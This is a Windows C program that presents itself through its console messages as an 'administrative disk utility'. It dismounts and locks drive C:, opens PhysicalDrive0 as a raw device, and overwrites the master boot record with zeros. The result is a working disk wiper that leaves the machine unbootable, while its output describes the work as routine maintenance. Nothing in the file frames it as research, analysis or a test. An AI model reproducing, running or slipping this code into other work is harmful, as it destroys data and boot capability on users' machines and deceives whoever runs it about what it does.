#include <windows.h>
#include <stdio.h>
#include <winioctl.h>

int main() {
    DWORD bytesReturned = 0;
    DWORD bytesWritten = 0;

    printf("[+] Initializing administrative disk utility...\n");

    // =========================================================================
    // STEP 1: Handle the Logical Volume Layer (e.g., the partition)
    // =========================================================================
    HANDLE hVolume = CreateFileA(
        "\\\\.\\C:",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hVolume == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open volume handle. Error: %lu (Requires Elevation)\n", GetLastError());
        return 1;
    }
    printf("[+] Obtained handle to logical volume C:\n");

    BOOL isDismounted = DeviceIoControl(
        hVolume,
        FSCTL_DISMOUNT_VOLUME,
        NULL, 0,
        NULL, 0,
        &bytesReturned,
        NULL
    );

    if (!isDismounted) {
        printf("[-] Volume dismount rejected by kernel. Error: %lu\n", GetLastError());
        CloseHandle(hVolume);
        return 1;
    }
    printf("[+] Logical file system driver dismounted successfully.\n");

    BOOL isLocked = DeviceIoControl(
        hVolume,
        FSCTL_LOCK_VOLUME,
        NULL, 0,
        NULL, 0,
        &bytesReturned,
        NULL
    );

    if (!isLocked) {
        printf("[-] Volume lock rejected by kernel. Error: %lu\n", GetLastError());
        CloseHandle(hVolume);
        return 1;
    }
    printf("[+] Volume lock acquired successfully.\n");

    // =========================================================================
    // STEP 2: Handle the Master Physical Storage Interface
    // =========================================================================
    HANDLE hDrive = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDrive == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open physical raw drive handle. Error: %lu\n", GetLastError());
        CloseHandle(hVolume);
        return 1;
    }
    printf("[+] Successfully obtained master handle to PhysicalDrive0.\n");

    // =========================================================================
    // STEP 3: Execution Context / MBR Overwrite
    // =========================================================================
    char sectorBuffer[512];
    ZeroMemory(sectorBuffer, sizeof(sectorBuffer));

    BOOL isWritten = WriteFile(
        hDrive,
        sectorBuffer,
        sizeof(sectorBuffer),
        &bytesWritten,
        NULL
    );

    if (isWritten && bytesWritten == 512) {
        printf("[+] Successfully overwrote the target physical sector with zeros (%lu bytes written).\n", bytesWritten);
    } else {
        printf("[-] Write failed or incomplete. Error: %lu\n", GetLastError());
    }

    // Cleanup resources in reverse allocation order
    CloseHandle(hDrive);
    CloseHandle(hVolume);
    printf("[+] Maintenance interfaces cleanly closed.\n");

    return 0;
}
